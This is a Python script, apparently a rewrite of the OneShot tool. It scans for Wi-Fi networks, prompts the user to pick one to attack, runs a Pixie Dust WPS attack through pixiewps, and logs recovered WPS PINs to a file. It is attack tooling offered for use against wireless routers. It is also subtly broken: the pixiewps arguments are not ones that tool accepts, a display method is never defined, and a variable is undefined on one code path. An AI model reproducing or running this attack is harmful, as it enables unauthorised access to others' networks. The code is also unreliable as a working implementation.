#!/usr/bin/env python3

import argparse
import logging
import asyncio
import sys
import re
import subprocess
import json
from typing import List, Dict, Optional
from pathlib import Path
from dataclasses import dataclass
from datetime import datetime

@dataclass
class WifiNetwork:
    bssid: str
    channel: int
    essid: str
    wps_locked: bool = False
    wps_version: str = "Unknown"
    signal_strength: int = 0

class OneShot:
    def __init__(self):
        self.interface: str = ""
        self.target_bssid: Optional[str] = None
        self.pin: Optional[str] = None
        self.verbose: bool = False
        self.networks: List[WifiNetwork] = []
        self.logger = self._setup_logging()

    @staticmethod
    def _setup_logging() -> logging.Logger:
        logger = logging.getLogger("OneShot")
        handler = logging.StreamHandler()
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger

    async def check_dependencies(self) -> None:
        """Verify all required tools are installed."""
        required_tools = ['wpa_supplicant', 'pixiewps', 'iw']
        
        for tool in required_tools:
            try:
                await asyncio.create_subprocess_exec(
                    'which', 
                    tool, 
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            except FileNotFoundError:
                self.logger.error(f"Required tool '{tool}' not found. Please install it.")
                sys.exit(1)

    async def scan_networks(self) -> None:
        """Scan for available WiFi networks."""
        try:
            process = await asyncio.create_subprocess_exec(
                'iw', 
                self.interface, 
                'scan',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                raise RuntimeError(f"Network scan failed: {stderr.decode()}")

            self._parse_scan_results(stdout.decode())
            
        except Exception as e:
            self.logger.error(f"Error during network scan: {str(e)}")
            sys.exit(1)

    def _parse_scan_results(self, scan_output: str) -> None:
        """Parse iw scan results and populate networks list."""
        current_network = None
        
        for line in scan_output.split('\n'):
            if 'BSS' in line and '(' in line:
                if current_network:
                    self.networks.append(current_network)
                
                bssid = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
                if bssid:
                    current_network = WifiNetwork(
                        bssid=bssid.group(),
                        channel=0,
                        essid=""
                    )
            
            elif current_network:
                if 'SSID: ' in line:
                    current_network.essid = line.split('SSID: ')[1].strip()
                elif 'channel' in line:
                    try:
                        current_network.channel = int(re.search(r'channel (\d+)', line).group(1))
                    except (AttributeError, ValueError):
                        pass

    async def run_pixie_dust_attack(self, network: WifiNetwork) -> bool:
        """Execute Pixie Dust attack on target network."""
        try:
            cmd = [
                'pixiewps',
                '--bssid', network.bssid,
                '--channel', str(network.channel),
                '--interface', self.interface
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                self._handle_successful_attack(stdout.decode())
                return True
                
            return False
            
        except Exception as e:
            self.logger.error(f"Pixie Dust attack failed: {str(e)}")
            return False

    def _handle_successful_attack(self, output: str) -> None:
        """Process and save successful attack results."""
        # Extract WPS PIN and network credentials if available
        pin_match = re.search(r'WPS PIN: (\d+)', output)
        if pin_match:
            pin = pin_match.group(1)
            self.logger.info(f"Successfully recovered WPS PIN: {pin}")
            
            # Save results
            results = {
                'timestamp': datetime.now().isoformat(),
                'bssid': self.target_bssid,
                'pin': pin,
                'raw_output': output
            }
            
            with open('oneshot_results.json', 'a') as f:
                json.dump(results, f)
                f.write('\n')

    async def main(self) -> None:
        """Main execution flow."""
        parser = self._create_argument_parser()
        args = parser.parse_args()
        
        self.interface = args.interface
        self.target_bssid = args.bssid
        self.pin = args.pin
        self.verbose = args.verbose

        if self.verbose:
            self.logger.setLevel(logging.DEBUG)
        
        await self.check_dependencies()
        
        if not self.target_bssid:
            await self.scan_networks()
            if not self.networks:
                self.logger.error("No networks found!")
                return
                
            self._display_networks()
            selected = input("Select network number to attack (or q to quit): ")
            if selected.lower() == 'q':
                return
                
            try:
                network = self.networks[int(selected)]
                self.target_bssid = network.bssid
            except (ValueError, IndexError):
                self.logger.error("Invalid selection!")
                return

        if args.pixie_dust:
            success = await self.run_pixie_dust_attack(network)
            if success:
                self.logger.info("Attack completed successfully!")
            else:
                self.logger.error("Attack failed!")

    @staticmethod
    def _create_argument_parser() -> argparse.ArgumentParser:
        """Create and configure argument parser."""
        parser = argparse.ArgumentParser(description='Modern OneShot WPS Attacks')
        parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
        parser.add_argument('-b', '--bssid', help='Target BSSID')
        parser.add_argument('-p', '--pin', help='WPS PIN to try')
        parser.add_argument('-K', '--pixie-dust', action='store_true', help='Run Pixie Dust attack')
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        return parser

if __name__ == "__main__":
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    oneshot = OneShot()
    asyncio.run(oneshot.main())
